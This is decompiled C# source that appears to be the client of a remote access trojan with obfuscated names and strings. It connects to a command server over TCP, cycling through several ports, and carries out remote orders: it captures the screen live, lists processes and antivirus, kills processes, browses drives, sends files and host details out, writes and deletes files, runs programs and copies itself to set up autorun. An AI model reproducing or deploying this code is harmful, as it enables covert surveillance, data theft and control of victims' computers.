using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dtiardhues;

public class MLREDM
{
	public bool dtiardhuesis_working = false;

	private bool dtiardhuesiswitch = false;

	private bool dtiardhuesthrRuning = false;

	private bool dtiardhuesstr_writer = false;

	private bool dtiardhuescapScreen = false;

	private Dictionary<string, byte[]> dtiardhuestasks = new Dictionary<string, byte[]>();

	public NetworkStream dtiardhuesnetStream;

	private int dtiardhuesbuffSize = 1024;

	private DLRZRIVF dtiardhuesHD = new DLRZRIVF();

	private int dtiardhuesbytesRead = 0;

	public bool dtiardhuesreqCnls = false;

	public bool dtiardhuesautCnls = false;

	public DateTime dtiardhueslTimeUtc;

	private Thread dtiardhuesfunThread;

	private ELDRARE dtiardhuesStateObj = new ELDRARE();

	private MLRLEINF dtiardhuesUPC;

	private OLRDMR dtiardhuesCMD;

	private int dtiardhuesscrSize = 200;

	private ThreadStart dtiardhuesfunStarter;

	public int port_sn = 0;

	public TcpClient dtiardhuestcpsck;

	private MemoryStream msStram = new MemoryStream();

	private SLCLRNS dtiardhuescaps = new SLCLRNS();

	private Bitmap image;

	public void dtiardhuessaveFile(string filePath)
	{
		try
		{
			byte[] array = dtiardhuespull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	private void dtiardhuessee_responce()
	{
		if (!dtiardhuesiswitch)
		{
			dtiardhuesiswitch = true;
			dtiardhuesnetStream = dtiardhuesCMD.dtiardhuesNS(dtiardhuestcpsck);
			dtiardhuescapScreen = false;
			while (dtiardhuesis_working)
			{
				string[] switchType = dtiardhuesget_command();
				if (switchType != null)
				{
					dtiardhuesreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("dtiardhues-" + text) : ("dtiardhues-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "dtiardhues-procl":
						dtiardhuesfunStarter = delegate
						{
							dtiardhueslist_processes("procl");
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-getavs":
						dtiardhuesfunStarter = delegate
						{
							dtiardhueslist_processes("getavs");
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-thumb":
						dtiardhuesimage_info(switchType[1]);
						break;
					case "dtiardhues-putsrt":
						dtiardhuesload_app();
						break;
					case "dtiardhues-filsz":
						dtiardhuesfile_info(switchType[1]);
						break;
					case "dtiardhues-rupth":
						dtiardhuespush_data(null, "dtiardhues-appth=|dtiardhues".Split(new char[1] { '|' })[0] + DLAONIF.dtiardhuesget_mpath());
						break;
					case "dtiardhues-dowf":
						dtiardhuessaveFile(switchType[1]);
						break;
					case "dtiardhues-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "dtiardhues-scrsz":
						dtiardhuesscreenSize(switchType[1]);
						break;
					case "dtiardhues-cscreen":
						dtiardhuessee_scren(switchType[1]);
						break;
					case "dtiardhues-dirs":
						dtiardhuesfunThread = new Thread(dtiardhueslistDrives);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-stops":
						dtiardhuescapScreen = false;
						break;
					case "dtiardhues-scren":
						dtiardhuescapScreen = true;
						dtiardhuesfunStarter = delegate
						{
							dtiardhuesis_screen(switchType[1]);
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-cnls":
						dtiardhuesautCnls = true;
						dtiardhuesreqCnls = true;
						dtiardhuescapScreen = false;
						break;
					case "dtiardhues-udlt":
						dtiardhuesCMD.dtiardhuesremove_user();
						break;
					case "dtiardhues-delt":
						dtiardhuesremove_file(switchType[1]);
						break;
					case "dtiardhues-afile":
						dtiardhuesfunStarter = delegate
						{
							dtiardhuessend_auto(switchType[1]);
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-listf":
						dtiardhuesfunStarter = delegate
						{
							dtiardhuesHD.dtiardhueslookFiles(switchType[1]);
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-file":
						dtiardhuesfunStarter = delegate
						{
							dtiardhuespush_file(switchType[1]);
						};
						dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-info":
						dtiardhuesfunThread = new Thread(dtiardhuesuser_info);
						dtiardhuesfunThread.Start();
						break;
					case "dtiardhues-runf":
						dtiardhuesCMD.dtiardhuesdo_process(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "dtiardhues-fles":
					{
						string files = dtiardhuesHD.dtiardhueslookupFiles(switchType[1]);
						if (files != null)
						{
							dtiardhuesfunStarter = delegate
							{
								dtiardhuespush_data(null, "dtiardhues-fles=|dtiardhues".Split(new char[1] { '|' })[0] + files);
							};
							dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
							dtiardhuesfunThread.Start();
						}
						break;
					}
					case "dtiardhues-dowr":
						dtiardhuessaveFile(switchType[1]);
						break;
					case "dtiardhues-fldr":
					{
						string Folders = dtiardhuesHD.dtiardhuescheckFolders(switchType[1]);
						if (Folders != null)
						{
							dtiardhuesfunStarter = delegate
							{
								dtiardhuespush_data(null, "dtiardhues-fldr=|dtiardhues".Split(new char[1] { '|' })[0] + Folders);
							};
							dtiardhuesfunThread = new Thread(dtiardhuesfunStarter);
							dtiardhuesfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				dtiardhuesis_working = false;
				break;
			}
			dtiardhuesis_working = false;
			dtiardhuescapScreen = false;
		}
		dtiardhuesiswitch = false;
	}

	public void dtiardhuesdo_start()
	{
		DLAONIF.dtiardhuesport = DLAONIF.ports[0];
		dtiardhuesUPC = new MLRLEINF();
		dtiardhuesCMD = new OLRDMR(this);
		dtiardhuesHD.iserver = this;
		dtiardhuesHD.dtiardhuesmainPath = DLAONIF.dtiardhuesget_mpath();
		TimerCallback callback = dtiardhueslookup_connect;
		Timer dtiardhuestimer = new Timer(callback, dtiardhuesStateObj, 31280, 37420);
		dtiardhuesStateObj.dtiardhuestimer = dtiardhuestimer;
	}

	private bool dtiardhuesIPSConfig()
	{
		try
		{
			DLAONIF.dtiardhuesdefaultP = dtiardhuesCMD.dtiardhuesserverIPD();
			dtiardhuestcpsck = new TcpClient();
			dtiardhuestcpsck.Connect(DLAONIF.dtiardhuesdefaultP, DLAONIF.dtiardhuesport);
			return true;
		}
		catch
		{
			dtiardhuesports_switch();
			return false;
		}
	}

	public string dtiardhuesfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|dtiardhues".Split(new char[1] { '|' })[0] : "<|dtiardhues".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|dtiardhues".Split(new char[1] { '|' })[0] : "<|dtiardhues".Split(new char[1] { '|' })[0]);
			text = text + dtiardhuesget_size(fileInfo.Length) + ((!ret) ? ">|dtiardhues".Split(new char[1] { '|' })[0] : "<|dtiardhues".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				dtiardhuespush_data(null, "dtiardhues-filsz=|dtiardhues".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void dtiardhueslookup_connect(object zource)
	{
		try
		{
			if (!dtiardhuesthrRuning)
			{
				dtiardhuesthrRuning = true;
				if (!dtiardhuesis_working || !dtiardhuestcpsck.Connected)
				{
					dtiardhuesis_working = dtiardhuesIPSConfig();
					if (dtiardhuesis_working)
					{
						dtiardhuesbuffSize = dtiardhuestcpsck.ReceiveBufferSize;
						dtiardhuessee_responce();
					}
				}
			}
			dtiardhuesthrRuning = false;
		}
		catch
		{
			dtiardhuesthrRuning = false;
			dtiardhuesstr_writer = false;
			dtiardhuesis_working = false;
			dtiardhuesiswitch = false;
		}
	}

	public void dtiardhuesports_switch()
	{
		try
		{
			port_sn++;
			DLAONIF.dtiardhuesport = DLAONIF.ports[port_sn];
			if (port_sn >= DLAONIF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool dtiardhuessend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				dtiardhuespush_data(data, "dtiardhues-afile=" + fileinfo);
				return false;
			}
			dtiardhuespush_data(null, "dtiardhues-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void dtiardhueslist_processes(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|dtiardhues".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|dtiardhues".Split(new char[1] { '|' })[0];
				text += "0>|dtiardhues".Split(new char[1] { '|' })[0];
				try
				{
					text = text + FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName).FileDescription + "<";
				}
				catch
				{
					text += "<";
				}
			}
			if (text == "")
			{
				text = "No-Found!> > > <|dtiardhues".Split(new char[1] { '|' })[0];
			}
			byte[] byteArray = DLAONIF.getByteArray(text);
			dtiardhuespush_data(byteArray, "dtiardhues-" + cmd + "=pcess|dtiardhues".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void dtiardhuesload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = DLAONIF.dtiardhuesget_mpath() + DLAONIF.dtiardhuesmainApp + ".exe|dtiardhues".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			DLAONIF.dtiardhuesset_run("sprad|dtiardhues".Split(new char[1] { '|' })[0], DLAONIF.dtiardhuesget_mpath() + DLAONIF.dtiardhuesmainApp + ".exe|dtiardhues".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void dtiardhuesimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|dtiardhues".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|dtiardhues".Split(new char[1] { '|' })[0];
				text = text + dtiardhuesget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				dtiardhuespush_data(memoryStream.ToArray(), "dtiardhues-thumb=|dtiardhues".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void dtiardhuessee_scren(string screenSize)
	{
		try
		{
			dtiardhuesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			image = dtiardhuescaps.dtiardhuesscreen(dtiardhuesscrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			dtiardhuespush_data(msStram.ToArray(), "dtiardhues-sascr=dtiardhues|dtiardhues".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void dtiardhuesis_screen(string screenSize)
	{
		try
		{
			dtiardhuesscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (dtiardhuescapScreen && dtiardhuesis_working)
			{
				image = dtiardhuescaps.dtiardhuesscreen(dtiardhuesscrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				dtiardhuespush_data(msStram.ToArray(), "dtiardhues-scren=dtiardhues|dtiardhues".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void dtiardhuesuser_info()
	{
		string text = dtiardhuesUPC.dtiardhueslancard + "|" + dtiardhuesUPC.dtiardhuescname + "|" + dtiardhuesUPC.dtiardhuesuname + "|" + dtiardhuesUPC.dtiardhuesuip + "|" + DLAONIF.dtiardhuesOsname() + "|" + dtiardhuesUPC.dtiardhuesapver + "|";
		text += "| !dtiardhues".Split(new char[1] { '!' })[0];
		text = text + "|" + dtiardhuesUPC.dtiardhuesclientNum;
		text = text + "|" + DLAONIF.dtiardhuesget_mpath();
		byte[] byteArray = DLAONIF.getByteArray(text);
		dtiardhuespush_data(byteArray, "dtiardhues-info=uzer|dtiardhues".Split(new char[1] { '|' })[0]);
	}

	private void dtiardhuesscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			dtiardhuesscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	public bool dtiardhuespush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (dtiardhuesstr_writer)
			{
				return false;
			}
			dtiardhuesstr_writer = true;
			byte[] byteArray = DLAONIF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !dtiardhuesreqCnls)
			{
				int num5 = ((num4 > dtiardhuesbuffSize) ? dtiardhuesbuffSize : num4);
				dtiardhuesnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			dtiardhuesstr_writer = false;
			if (dtiardhuesreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			dtiardhuesstr_writer = false;
			dtiardhuesis_working = false;
			return false;
		}
	}

	private string dtiardhuesget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|dtiardhues".Split(new char[1] { '|' })[0],
				"KB|dtiardhues".Split(new char[1] { '|' })[0],
				"MB|dtiardhues".Split(new char[1] { '|' })[0],
				"GB|dtiardhues".Split(new char[1] { '|' })[0],
				"TB|dtiardhues".Split(new char[1] { '|' })[0],
				"PB|dtiardhues".Split(new char[1] { '|' })[0],
				"EB|dtiardhues".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void dtiardhuespush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				dtiardhuespush_data(File.ReadAllBytes(lfile), "dtiardhues-file=|dtiardhues".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void dtiardhuesremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] dtiardhuesget_command()
	{
		try
		{
			byte[] array = new byte[5];
			dtiardhuesbytesRead = dtiardhuesnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= dtiardhuesbytesRead)
			{
				int count = ((num3 > dtiardhuesbuffSize) ? dtiardhuesbuffSize : num3);
				dtiardhuesbytesRead = dtiardhuesnetStream.Read(array2, num2, count);
				num2 += dtiardhuesbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			dtiardhuesis_working = false;
			return null;
		}
	}

	public byte[] dtiardhuespull_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			dtiardhuesbytesRead = dtiardhuesnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !dtiardhuesreqCnls)
			{
				int count = ((num3 > dtiardhuesbuffSize) ? dtiardhuesbuffSize : num3);
				dtiardhuesbytesRead = dtiardhuesnetStream.Read(array2, num, count);
				num += dtiardhuesbytesRead;
				num3 -= dtiardhuesbytesRead;
			}
			if (dtiardhuesreqCnls)
			{
				dtiardhuesnetStream.Flush();
				while (dtiardhuesnetStream.DataAvailable && dtiardhuesnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			dtiardhuesis_working = false;
			return null;
		}
	}

	private void dtiardhueslistDrives()
	{
		try
		{
			string text = dtiardhuesHD.dtiardhueslookupDrives();
			dtiardhuespush_data(null, "dtiardhues-dirs=" + text);
		}
		catch
		{
		}
	}
}
